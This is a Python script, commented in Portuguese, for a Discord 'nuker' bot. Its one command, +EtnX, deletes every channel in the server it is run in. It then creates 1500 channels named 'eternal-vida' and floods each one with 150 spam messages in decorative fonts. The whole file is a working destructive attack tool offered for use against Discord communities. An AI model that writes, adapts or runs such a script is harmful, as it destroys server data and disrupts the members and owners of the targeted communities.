import discord
from discord.ext import commands
import asyncio
import random

# Configurações do bot
TOKEN = 'SEU_TOKEN_AQUI'  # Substitua pelo token do seu bot
PREFIX = '+'

# Lista de fontes diferentes para as mensagens
FONTES = [
    "𝐸𝑡𝑒𝑟𝑛𝑎𝑙 𝑒 𝑉𝑖𝑑𝑎!", "𝑬𝒕𝒆𝒓𝒏𝒂𝒍 𝒆 𝑽𝒊𝒅𝒂!", "𝕰𝖙𝖊𝖗𝖓𝖆𝖑 𝖊 𝖁𝖎𝖉𝖆!", 
    "🅴🆃🅴🆁🅽🅰🅻 🅴 🆅🅸🅳🅰!", "E̷t̷e̷r̷n̷a̷l̷ ̷é̷ ̷V̷i̷d̷a̷!̷", 
    "꧁Eternal é Vida!꧂", "☠️ ETERNAL É VIDA! ☠️", "『Eternal é Vida!』",
    "✺Eternal é Vida!✺", "☣ ETERNAL É VIDA ☣", "♛ Eternal é Vida ♛",
    "⟁ Eternal é Vida ⟁", "✪ Eternal é Vida ✪", "❂ Eternal é Vida ❂",
    "⟟ Eternal é Vida ⟟", "◈ Eternal é Vida ◈", "✦ Eternal é Vida ✦",
    "✧ Eternal é Vida ✧", "⋆ Eternal é Vida ⋆"
]

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f'Bot conectado como {bot.user}')
    print(f'ID do bot: {bot.user.id}')
    print(f'Servidores: {len(bot.guilds)}')
    await bot.change_presence(activity=discord.Game(name="Eternal é Vida!"))

@bot.command(name='EtnX')
async def etnx(ctx):
    """Comando que apaga todos os canais e cria novos"""
    
    try:
        # Apagar todos os canais existentes
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
                await asyncio.sleep(0.5)
            except:
                continue
                
        # Criar 1500 canais de texto
        for i in range(1500):
            try:
                new_channel = await ctx.guild.create_text_channel(f"eternal-vida-{i+1}")
                print(f"Canal criado: {new_channel.name} ({i+1}/1500)")
                
                # Enviar 150 mensagens no canal
                for _ in range(150):
                    fonte_aleatoria = random.choice(FONTES)
                    await new_channel.send(f"**{fonte_aleatoria}**")
                    await asyncio.sleep(0.1)
                    
            except discord.errors.HTTPException as e:
                print(f"Erro ao criar canal {i+1}: {e}")
                break
            except Exception as e:
                print(f"Erro inesperado: {e}")
                continue
                
            # Pequena pausa para não sobrecarregar
            if i % 10 == 0:
                await asyncio.sleep(2)
                
        print("✅ Operação concluída!")
        
    except Exception as e:
        print(f"Erro geral: {e}")

# Executar o bot
if __name__ == "__main__":
    try:
        bot.run(TOKEN)
    except discord.errors.LoginFailure:
        print("❌ Token inválido! Verifique o token do seu bot.")
    except Exception as e:
        print(f"❌ Erro ao iniciar o bot: {e}")
